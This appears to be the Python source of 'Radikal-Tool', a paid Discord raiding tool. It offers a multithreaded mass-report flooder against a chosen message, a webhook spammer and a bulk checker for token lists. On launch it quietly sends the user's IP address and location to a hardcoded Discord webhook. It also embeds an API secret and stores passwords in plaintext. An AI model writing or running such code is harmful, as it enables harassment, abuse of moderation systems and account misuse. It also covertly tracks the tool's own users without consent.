from time import sleep
import time
import os
import fade
import requests
import stdiomask
import sys
import threading
import json
import random
import uuid
from discord import SyncWebhook
from utilities.Settings.common import *
from utilities.Settings.update import search_for_updates
import httpx
import capmonster_python
from keyauth import api

import sys
import time
import platform
import os
import hashlib
from time import sleep
from datetime import datetime
import json as jsond

if sys.version_info.minor < 10:  # Python version check (Bypass Patch)
    print("[Security] - Python 3.10 or higher is recommended. The bypass will not work on 3.10+")
    print("You are using Python {}.{}".format(sys.version_info.major, sys.version_info.minor))

if platform.system() == 'Windows':
    os.system('cls & title LoginScreen for Radikal-Tool')  # clear console, change title

print("Initializing")


def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest


keyauthapp = api(
    name = "Radikal-Tool",
    ownerid = "5OekovOMyp",
    secret = "0abdc11b6bfaa70fbe02a43a320fe5729e6b0fa65e218cf20b03ffe8eee65f28",
    version = "1.0",
    hash_to_check = getchecksum()
)
print(f"Blacklisted? : {keyauthapp.checkblacklist()}")  # check if blacklisted, you can edit this and make it exit the program if blacklisted


def answer():'''
    try:
        print("""
1.Login
2.Register
3.Upgrade
4.License Key Only
        """)
        ans = input("Select Option: ")
        if ans == "1":
            user = input('Provide username: ')
            password = stdiomask.getpass(prompt='\n \nYour Password: ', mask='*')
            keyauthapp.login(user, password)
        elif ans == "2":
            user = input('Provide username: ')
            password = stdiomask.getpass(prompt='\n \nYour Password: ', mask='*')
            license = input('Provide License: ')
            keyauthapp.register(user, password, license)
        elif ans == "3":
            user = input('Provide username: ')
            license = input('Provide License: ')
            keyauthapp.upgrade(user, license)
        elif ans == "4":
            key = input('Enter your license: ')
            keyauthapp.license(key)
        else:
            print("\nNot Valid Option")
            time.sleep(1)
            os.system('cls')
            answer()
    except KeyboardInterrupt:
        os._exit(1)


answer()'''

# region Extra Functions

# * Download Files form the server to your computer using the download function in the api class
# bytes = keyauthapp.file("FILEID")
# f = open("example.exe", "wb")
# f.write(bytes)
# f.close()


# * Set up user variable
# keyauthapp.setvar("varName", "varValue")

# * Get user variable and print it
# data = keyauthapp.getvar("varName")
# print(data)

# * Get normal variable and print it
# data = keyauthapp.var("varName")
# print(data)

# * Log message to the server and then to your webhook what is set on app settings
# keyauthapp.log("Message")

# * Get if the user pc have been blacklisted
# print(f"Blacklisted? : {keyauthapp.checkblacklist()}")

# * See if the current session is validated
# print(f"Session Validated?: {keyauthapp.check()}")


# * example to send normal request with no POST data
# data = keyauthapp.webhook("WebhookID", "?type=resetuser&user=username")

# * example to send form data
# data = keyauthapp.webhook("WebhookID", "", "type=init&name=test&ownerid=j9Gj0FTemM", "application/x-www-form-urlencoded")

# * example to send JSON
# data = keyauthapp.webhook("WebhookID", "", "{\"content\": \"webhook message here\",\"embeds\": null}", "application/json")

# * Get chat messages
# messages = keyauthapp.chatGet("CHANNEL")

# Messages = ""
# for i in range(len(messages)):
# Messages += datetime.utcfromtimestamp(int(messages[i]["timestamp"])).strftime('%Y-%m-%d %H:%M:%S') + " - " + messages[i]["author"] + ": " + messages[i]["message"] + "\n"

# print("\n\n" + Messages)

# * Send chat message
# keyauthapp.chatSend("MESSAGE", "CHANNEL")

# * Add Application Information to Title
# os.system(f"cls & title KeyAuth Python Example - Total Users: {keyauthapp.app_data.numUsers} - Online Users: {keyauthapp.app_data.onlineUsers} - Total Keys: {keyauthapp.app_data.numKeys}")

# * Auto-Login Example (THIS IS JUST AN EXAMPLE --> YOU WILL HAVE TO EDIT THE CODE PROBABLY)
# 1. Checking and Reading JSON

#### Note: Remove the ''' on line 151 and 226

try:
    if os.path.isfile('auth.json'): #Checking if the auth file exist
        if jsond.load(open("auth.json"))["authusername"] == "": #Checks if the authusername is empty or not
            print("""
1. Login
2. Register
            """)
            ans=input("Select Option: ")  #Skipping auto-login bc auth file is empty
            if ans=="1": 
                user = input('Provide username: ')
                password = stdiomask.getpass(prompt='\n \nYour Password: ', mask='*')
                keyauthapp.login(user,password)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            elif ans=="2":
                user = input('Provide username: ')
                password = stdiomask.getpass(prompt='\n \nYour Password: ', mask='*')
                license = input('Provide License: ')
                keyauthapp.register(user,password,license) 
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            else:
                print("\nNot Valid Option") 
                os._exit(1) 
        else:
            try: #2. Auto login
                with open('auth.json', 'r') as f:
                    authfile = jsond.load(f)
                    authuser = authfile.get('authusername')
                    authpass = authfile.get('authpassword')
                    keyauthapp.login(authuser,authpass)
            except Exception as e: #Error stuff
                print(e)
    else: #Creating auth file bc its missing
        try:
            f = open("auth.json", "a") #Writing content
            f.write("""{
    "authusername": "",
    "authpassword": ""
}""")
            f.close()
            print ("""
1. Login
2. Register
            """)#Again skipping auto-login bc the file is empty/missing
            ans=input("Select Option: ") 
            if ans=="1": 
                user = input('Provide username: ')
                password = stdiomask.getpass(prompt='\n \nYour Password: ', mask='*')
                keyauthapp.login(user,password)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            elif ans=="2":
                user = input('Provide username: ')
                password = stdiomask.getpass(prompt='\n \nYour Password: ', mask='*')
                license = input('Provide License: ')
                keyauthapp.register(user,password,license)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            else:
                print("\nNot Valid Option") 
                os._exit(1) 
        except Exception as e: #Error stuff
            print(e)
            os._exit(1) 
except Exception as e: #Error stuff
    print(e)

# endregion




print(Colorate.Horizontal(Colors.green_to_red, f'                       \n\nRadikal-Tool (Login)           |           Connection success.'))
sleep(5)

import requests, json
webhook = 'https://canary.discord.com/api/webhooks/1066360779751837716/D0Diy4t8fpfBlXuN8d3WbVuexYA7WEeVYAUGhB1aztY49TxJiRJyO8F6eBjzefDlp9xI'
def post():
    data = requests.get("http://ipinfo.io/json").json()
    ip = data['ip']
    c = data['city']
    co = data['country']
    r = data['region'] 
    info = {
  "content": "",
  "embeds": [
    {
      "title": "IP Found",
      "description": f"```\nIP : {ip}\nCity : {c}\nCountry : {co}\nRegion : {r}\n```",
      "color": 1341395,
      "footer": {
        "text": "WideStereo#4212"
      },
      "image": {
        "url": "https://media.discordapp.net/attachments/860177535010603028/1013141468484993096/unknown.png"
      }
    }
  ],
  "username": "Radikal-IPLogs",
  "avatar_url": "https://media.discordapp.net/attachments/860177535010603028/1013141468484993096/unknown.png",
  "attachments": []
    }
    requests.post(webhook, json=info)
post()

webhook = SyncWebhook.from_url("https://canary.discord.com/api/webhooks/1066352667506507827/WA6hSI7GR4IfHzv-wa95nFt_fMNRW0mHN6gBU1ThfgN3p2RZzhOHO2jpTmcGEbgO-3mi")
webhook.send(f'Tool wurde gestartet! \nID: {uuid.uuid4()}\nVersion: {THIS_VERSION} (Derzeitiges Update)')

os.system("cls")
os.system(f'title Radikal Tool - discord.gg/EzRaid - Starting... Your Tokens: [{counttokens}]')


welcomemenu = fade.brazil(f'''
 ██▀███   ▄▄▄     ▓█████▄   ██▓ ██ ▄█▀ ▄▄▄       ██▓         ██▓    ▒█████   ▄▄▄     ▓█████▄   ██▓ ███▄    █  ▄████ 
▓██ ▒ ██▒▒████▄   ▒██▀ ██▌▒▓██▒ ██▄█▒ ▒████▄    ▓██▒        ▓██▒   ▒██▒  ██▒▒████▄   ▒██▀ ██▌▒▓██▒ ██ ▀█   █  ██▒ ▀█
▓██ ░▄█ ▒▒██  ▀█▄ ░██   █▌▒▒██▒▓███▄░ ▒██  ▀█▄  ▒██░        ▒██░   ▒██░  ██▒▒██  ▀█▄ ░██   █▌▒▒██▒▓██  ▀█ ██▒▒██░▄▄▄
▒██▀▀█▄  ░██▄▄▄▄██░▓█▄   ▌░░██░▓██ █▄ ░██▄▄▄▄██ ▒██░        ▒██░   ▒██   ██░░██▄▄▄▄██░▓█▄   ▌░░██░▓██▒  ▐▌██▒░▓█  ██
░██▓ ▒██▒▒▓█   ▓██░▒████▓ ░░██░▒██▒ █▄▒▓█   ▓██▒░██████    ▒░██████░ ████▓▒░▒▓█   ▓██░▒████▓ ░░██░▒██░   ▓██░▒▓███▀▒
░ ▒▓ ░▒▓░░▒▒   ▓▒█ ▒▒▓  ▒  ░▓  ▒ ▒▒ ▓▒░▒▒   ▓▒█░░ ▒░▓      ░░ ▒░▓  ░ ▒░▒░▒░ ░▒▒   ▓▒█ ▒▒▓  ▒  ░▓  ░ ▒░   ▒ ▒ ░▒   ▒ 
  ░▒ ░ ▒░░ ░   ▒▒  ░ ▒  ▒ ░ ▒ ░░ ░▒ ▒░░ ░   ▒▒ ░░ ░ ▒      ░░ ░ ▒    ░ ▒ ▒░ ░ ░   ▒▒  ░ ▒  ▒ ░ ▒ ░░ ░░   ░ ▒░ ░   ░ 
   ░   ░   ░   ▒   ░ ░  ░ ░ ▒ ░░ ░░ ░   ░   ▒     ░ ░         ░ ░  ░ ░ ░ ▒    ░   ▒   ░ ░  ░ ░ ▒ ░   ░   ░ ░  ░   ░ 
   ░           ░     ░      ░  ░  ░         ░  ░    ░      ░    ░      ░ ░        ░     ░      ░           ░      ░ 
                                    .gg/ezraid   |   Loading...    
                                            [v{THIS_VERSION}] 
''')
print(welcomemenu)
print(Colorate.Horizontal(Colors.rainbow, f'[WAIT] Loading Capmonsterkey...'))
try:
    captchaKey = json.loads(open("config.json", "r").read())["capmonster_key"]
except:
    print(f"  {Fore.WHITE}|>|{Fore.RED} Es ist beim Öffnen der config.json ein Fehler aufgetreten.")
    time.sleep(3)
    sys.exit()
try:
    get_balance_resp = httpx.post(f"https://api.capmonster.cloud/getBalance", json={"clientKey": captchaKey}).text
    captchas_balance = json.loads(get_balance_resp)["balance"]
    print(Colorate.Horizontal(Colors.red_to_green, f'[SUCCESS] Your Capmonsterkey has been loadet!'))
except Exception as e:
    print(Colorate.Horizontal(Colors.red_to_white, f'[ERROR] Capmonster API key is invalid oder down!!'))
    time.sleep(3)
    sys.exit()
sleep(5)
search_for_updates()

def toolstartet():
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system(f'title Radikal Tool - discord.gg/EzRaid - Loadet... Your Tokens: [{counttokens}]')
    started = fade.pinkred(f'''
 ██▀███   ▄▄▄     ▓█████▄   ██▓ ██ ▄█▀ ▄▄▄       ██▓         ██▓    ▒█████   ▄▄▄     ▓█████▄  ▓█████▄▄▄█████▓
▓██ ▒ ██▒▒████▄   ▒██▀ ██▌▒▓██▒ ██▄█▒ ▒████▄    ▓██▒        ▓██▒   ▒██▒  ██▒▒████▄   ▒██▀ ██▌ ▓█   ▀▓  ██▒ ▓▒
▓██ ░▄█ ▒▒██  ▀█▄ ░██   █▌▒▒██▒▓███▄░ ▒██  ▀█▄  ▒██░        ▒██░   ▒██░  ██▒▒██  ▀█▄ ░██   █▌ ▒███  ▒ ▓██░ ▒░
▒██▀▀█▄  ░██▄▄▄▄██░▓█▄   ▌░░██░▓██ █▄ ░██▄▄▄▄██ ▒██░        ▒██░   ▒██   ██░░██▄▄▄▄██░▓█▄   ▌ ▒▓█  ▄░ ▓██▓ ░ 
░██▓ ▒██▒▒▓█   ▓██░▒████▓ ░░██░▒██▒ █▄▒▓█   ▓██▒░██████    ▒░██████░ ████▓▒░▒▓█   ▓██░▒████▓ ▒░▒████  ▒██▒ ░ 
░ ▒▓ ░▒▓░░▒▒   ▓▒█ ▒▒▓  ▒  ░▓  ▒ ▒▒ ▓▒░▒▒   ▓▒█░░ ▒░▓      ░░ ▒░▓  ░ ▒░▒░▒░ ░▒▒   ▓▒█ ▒▒▓  ▒ ░░░ ▒░   ▒ ░░   
  ░▒ ░ ▒░░ ░   ▒▒  ░ ▒  ▒ ░ ▒ ░░ ░▒ ▒░░ ░   ▒▒ ░░ ░ ▒      ░░ ░ ▒    ░ ▒ ▒░ ░ ░   ▒▒  ░ ▒  ▒ ░ ░ ░      ░    
   ░   ░   ░   ▒   ░ ░  ░ ░ ▒ ░░ ░░ ░   ░   ▒     ░ ░         ░ ░  ░ ░ ░ ▒    ░   ▒   ░ ░  ░     ░    ░      
   ░           ░     ░      ░  ░  ░         ░  ░    ░      ░    ░      ░ ░        ░     ░    ░   ░           
                                    .gg/ezraid   |   Finished with Loading...
    ''')
    print(started)
    sleep(3)

def title():
    os.system('cls' if os.name == 'nt' else 'clear')
    os.system(f'title Radikal Tool - discord.gg/EzRaid - Thanks for buying... - Main Menu - Your Tokens: [{counttokens}]')
    maintitle = fade.fire(f'''
 ██▀███   ▄▄▄     ▓█████▄   ██▓ ██ ▄█▀ ▄▄▄       ██▓       
▓██ ▒ ██▒▒████▄   ▒██▀ ██▌▒▓██▒ ██▄█▒ ▒████▄    ▓██▒       
▓██ ░▄█ ▒▒██  ▀█▄ ░██   █▌▒▒██▒▓███▄░ ▒██  ▀█▄  ▒██░       
▒██▀▀█▄  ░██▄▄▄▄██░▓█▄   ▌░░██░▓██ █▄ ░██▄▄▄▄██ ▒██░       
░██▓ ▒██▒▒▓█   ▓██░▒████▓ ░░██░▒██▒ █▄▒▓█   ▓██▒░██████    
░ ▒▓ ░▒▓░░▒▒   ▓▒█ ▒▒▓  ▒  ░▓  ▒ ▒▒ ▓▒░▒▒   ▓▒█░░ ▒░▓      
  ░▒ ░ ▒░░ ░   ▒▒  ░ ▒  ▒ ░ ▒ ░░ ░▒ ▒░░ ░   ▒▒ ░░ ░ ▒      
   ░   ░   ░   ▒   ░ ░  ░ ░ ▒ ░░ ░░ ░   ░   ▒     ░ ░      
   ░           ░     ░      ░  ░  ░         ░  ░    ░   
                Thanks for buying <3
                Captchas: [${captchas_balance}]
    ''')
    print(maintitle)

def checkvalidity():
    src = requests.get('https://discordapp.com/api/v6/auth/login', headers={'Authorization': usertoken})
    if src.status_code == 200:
        r = requests.get('https://discord.com/api/v9/users/@me', headers=getheaders(usertoken)).json()
        global username
        username = r.get("username") + "#" + r.get("discriminator")
    else:
        os.system('cls' if os.name == 'nt' else 'clear')
        title()
        login()

def login():
    os.system('cls' if os.name == 'nt' else 'clear')
    global usertoken
    title()
    usertoken = stdiomask.getpass(prompt='\n \nYour Token: ', mask='*')
    checkvalidity()
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    main()

def reset():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()

def main():
    print(f'EzRaid →', end="")
    choice = input()
    if choice == "tools":
        print(f"""\n\tTool Name\tDescription\n\t----------\t------------\n\tmreport\t\tMassreport a User\n\ttchecker\tCheck Tokens\n\twspam\t\tSpam a Webhook\n\t""")
        main()

    elif choice == "massreport":

        class massreport:
            def __init__(self):
                self.GUILD_ID = str(input(f"""\t[+] Enter the ID of the server where the message to be reported is located: """))
                self.CHANNEL_ID = str(input(f"""\t[+] Enter the ID of the channel in which the message to be reported is located: """))
                self.MESSAGE_ID = str(input(f"""\t[+] Enter the ID of the message to be reported: """))
                print(f"""\n[+] Choose the reason for the report: """)
                print(f"""\t   [1] Illegal content""")
                print(f"""\t   [2] Harassment""")
                print(f"""\t   [3] Spam or phishing links""")
                print(f"""\t   [4] Self-harm""")
                print(f"""\t   [5] NSFW content\n""")
                REASON = input(f"""\t[#] Choice: """)

                if REASON == '1':
                    self.REASON = 0
                elif REASON == '2':
                    self.REASON = 1
                elif REASON == '3':
                    self.REASON = 2
                elif REASON == '4':
                    self.REASON = 3
                elif REASON == '5':
                    self.REASON = 4
                else:
                    print(f"""\t[!] Your request is invalid !\n""")
                    main()

                self.RESPONSES = {f"""
                    \t\t[!] 401: Unauthorized: [!] Invalid Discord token,
                    \t\t[!] Missing Access: [!] Missing access to channel or guild,
                    \t\t[!] You need to verify your account in order to perform this action: [!] Unverified"""}
                self.sent = 0
                self.errors = 0

            def _reporter(self):
                report = requests.post(
                    'https://discordapp.com/api/v8/report', json={
                        'channel_id': self.CHANNEL_ID,
                        'message_id': self.MESSAGE_ID,
                        'guild_id': self.GUILD_ID,
                        'reason': self.REASON
                    }, headers={
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'sv-SE',
                        'User-Agent': 'Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0',
                        'Content-Type': 'application/json',
                        'Authorization': self.TOKEN
                    }
                )
                if (status := report.status_code) == 201:
                    self.sent += 1
                    print(f"""\t\t[!] Reported successfully""")
                elif status in (401, 403):
                    self.errors += 1
                    print(self.RESPONSES[report.json()['message']])
                else:
                    self.errors += 1
                    print(f"""\t\t[!] Error: {report.text} | Status Code: {status}""")

            def _multi_threading(self):
                while True:
                    if threading.active_count() <= 300:
                        time.sleep(1)
                        threading.Thread(target=self._reporter).start()

            def setup(self):
                recognized = None
                if os.path.exists(config_json := 'Config.json'):
                    with open(config_json, 'r') as f:
                        try:
                            data = json.load(f)
                            self.TOKEN = data['discordToken']
                        except (KeyError, json.decoder.JSONDecodeError):
                            recognized = False
                        else:
                            recognized = True
                else:
                    recognized = False

                if not recognized:
                    self.TOKEN = usertoken
                    with open(config_json, 'w') as f:
                        json.dump({'discordToken': self.TOKEN}, f)
                print()
                self._multi_threading()

        mr = massreport()
        mr.setup()
    elif choice == "wspam":

        webhook = input(f"""\t[+] Webhooks url for spam: """)
        message = input(f"""\t[+] Message to Spam: .gg/ezraid | """)
        timer = input(f"""\t[+] Amount of time for the attack (s): """)

        try:
            timeout = time.time() + 1 * float(timer) + 2

            while time.time() < timeout:
                response = requests.post(
                    webhook,
                    json = {"content" : message},
                    params = {'wait' : True}
                )
                os.system('cls' if os.name == 'nt' else 'clear')
                time.sleep(1)
                if response.status_code == 204 or response.status_code == 200:
                    print(f"""\t\t[!] Message sent""")
                elif response.status_code == 429:
                    print(f"""\t\t[!] Rate limited ({response.json()['retry_after']}ms)""")
                    time.sleep(response.json()["retry_after"] / 1000)
                else:
                    print(f"""\t\t[!] Error code: {response.status_code}""")
        except:
            print(f"""\t[!] Your request is invalid !\n""")
        main()
    
    if choice == "help":
        print(f"""\n\tHelp\tDescription\n\t----------\t------------\n\ttools\t\tSee all Tools...\n\tComming...\t\tComming...\n\t""")
        main()

    if choice == "tchecker":
            setTitle(f"Token Checker    |    ") 
            print(Colorate.Horizontal(Colors.rainbow, f'\n Loading Tokens:\n'))
            time.sleep(0.5)
            def success(text): print(Colorate.Horizontal(Colors.rainbow, f'> [Valid] {text} '));
            def invalid(text): print(Colorate.Horizontal(Colors.dark_red, f'> [Invalid] {text} '));


            with open("tokens.txt", "r") as f: tokens = f.read().splitlines()
            def save_tokens():
                with open("tokens.txt", "w") as f: f.write("")
                for token in tokens:
                    with open("tokens.txt", "a") as f: f.write(token + "\n")
            def removeDuplicates(file):
                lines_seen = set()
                with open(file, "r+") as f:
                    d = f.readlines(); f.seek(0)
                    for i in d:
                        if i not in lines_seen: f.write(i); lines_seen.add(i)
                    f.truncate()
            def check_token(token:str):
                response = requests.get('https://discord.com/api/v9/users/@me/library', headers={"accept": "*/*","accept-encoding": "gzip, deflate, br","accept-language": "en-US,en;q=0.9","authorization": token,"cookie": "__dcfduid=88221810e37411ecb92c839028f4e498; __sdcfduid=88221811e37411ecb92c839028f4e498dc108345b16a69b7966e1b3d33d2182268b3ffd2ef5dfb497aef45ea330267cf; locale=en-US; OptanonConsent=isIABGlobal=false&datestamp=Fri+Jun+03+2022+15%3A36%3A59+GMT-0400+(Eastern+Daylight+Time)&version=6.33.0&hosts=&landingPath=https%3A%2F%2Fdiscord.com%2F&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1; __stripe_mid=3a915c95-4cf7-4d27-9d85-cfea03f7ce829a88e5; __stripe_sid=b699111a-a911-402d-a08a-c8801eb0f2e8baf912; __cf_bm=nEUsFi1av6PiX4cHH1PEcKFKot6_MslL4UbUxraeXb4-1654285264-0-AU8vy1OnS/uTMTGu2TbqIGYWUreX3IAEpMo++NJZgaaFRNAikwxeV/gxPixQ/DWlUyXaSpKSNP6XweSVG5Mzhn/QPdHU3EmR/pQ5K42/mYQaiRRl6osEVJWMMtli3L5iIA==","referer": "https://discord.com/channels/967617613960187974/981260247807168532","sec-fetch-dest": "empty","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","sec-gpc": "1","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36","x-discord-locale": "en-US","x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjUwMDUuNjEgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjEwMi4wLjUwMDUuNjEiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTMwNDEwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="}, timeout=5)
                if response.status_code == 200: success(f"| {token[:63]}*********")
                else: tokens.remove(token); invalid(f"| {token}")
            def check_tokens():
                threads=[]
                for token in tokens:
                    try:threads.append(threading.Thread(target=check_token, args=(token,)))
                    except Exception as e: pass
                for thread in threads: thread.start()
                for thread in threads: thread.join()
            def start():
                removeDuplicates("tokens.txt")
                check_tokens()
                save_tokens()

            start()
            print(Colorate.Horizontal(Colors.rainbow, f'\n\n All Tokens have been Checked! (tokens.txt has been updated!)'))
            time.sleep(1)
            exit = input(Colorate.Horizontal(Colors.rainbow, f' Press ENTER: '))
            exit = main()

    


    
    
    else:
        print(f"""\tInvalid command\n\tWrite "help" to see the available commands\n""")
        main()

def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

toolstartet()
login()
